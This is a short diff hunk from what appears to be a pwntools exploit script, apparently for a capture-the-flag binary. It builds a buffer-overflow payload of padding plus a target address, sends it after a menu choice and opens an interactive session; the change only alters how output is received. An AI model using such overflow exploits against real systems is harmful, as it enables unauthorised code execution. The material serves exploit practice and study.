@@ -8,5 +8,5 @@ payload += "A"*offset
 payload += target
 r.sendline("4")
 r.sendline(payload)
-r.recvuntil(">>")
+r.recvrepeat(1)
 r.interactive()
